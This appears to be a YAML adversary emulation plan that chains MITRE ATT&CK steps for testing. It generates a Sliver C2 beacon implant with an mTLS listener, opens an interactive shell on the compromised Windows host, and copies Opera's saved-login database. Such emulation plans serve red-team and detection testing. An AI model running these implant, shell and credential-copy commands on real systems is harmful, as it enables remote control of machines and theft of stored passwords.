  - emulation_plan_details:
      adversary_name: test
      creation_time: 2024-11-12 06:21:31 UTC+0000
  - uuid: 972f9f15-94e5-4b3f-a97a-053d1f8f7a98
    name: Sliver Windows Implant Generation
    id: T1071.004
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - 'Application Layer Protocol: Encrypted Channel'
    description: |
      Sliver generates implant for Windows platform and enables mtls monitoring.
    executor:
      command: |
        sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save .
        sliver > mtls
    arguments:
      attacker_ip:
        default:
        description: IP address of the attacker machine
        type:
      target_platform:
        default: windows
        description: The operating system type of the victim machine
        type:
    preconditions: []
    effects:
      - (prepared_sliver_implant)
  - uuid: 4a31f8db-89db-4f16-baab-47bb3f9d5b8a
    name:
    id:
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
    description:
    executor:
      command: |
        Manually download the sliver implant and execute it on the victim's machine
        sliver > sessions -i session_id //interact with a session
    arguments:
    preconditions:
      - (prepared_sliver_implant)
    effects:
      - (sliver_session)
  - uuid: 8315686c-035b-415e-9069-2e14799421e5
    name: Interactive Shell Access via Sliver
    id: T1059
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique: Command and Scripting Interpreter
    description: In the context of the Sliver framework, the command `shell` is used
      to open an interactive shell on the compromised machine associated with the
      active session.
    executor:
      command: |
        sliver (SESSION_NAME) > shell
    arguments:
    preconditions:
      - (sliver_session)
    effects:
      - (CAP_powershell_access ?e - executable)
  - uuid: 28498c17-57e4-495a-b0be-cc1e36de408b
    name: Simulating access to Opera Login Data
    id: T1555.003
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique: 'Credentials from Password Stores: Credentials from Web Browsers'
    description: |
      Simulates an adversary accessing encrypted credentials from Opera web browser's login database. 
    executor:
      name: powershell
      command: |
        Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
      cleanup_command: |
        Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
    arguments: []
    dependencies:
      - description: |
          Opera must be installed
        prereq_command: if (((Test-Path "$env:LOCALAPPDATA\Programs\Opera\launcher.exe")
          -Or (Test-Path "C:\Program Files\Opera\launcher.exe") -Or (Test-Path "C:\Program
          Files (x86)\Opera\launcher.exe"))) {exit 0} else {exit 1}
        get_prereq_command: |
          New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
          $installer = "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe"
          Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe
           Start-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
           Start-Sleep -s 180
          Stop-Process -Name "opera"
      - description: |
          Opera login data file must exist
        prereq_command: if (Test-Path "$env:APPDATA\Opera Software\Opera Stable\Login
          Data") {exit 0} else {exit 1}
        get_prereq_command: |
          New-Item -Path "$env:APPDATA\Opera Software\Opera Stable\ Login Data" -ItemType File
    preconditions:
      - (powershell)
    effects:
      - (exfiltrate_browser_login_data ?b - browser)
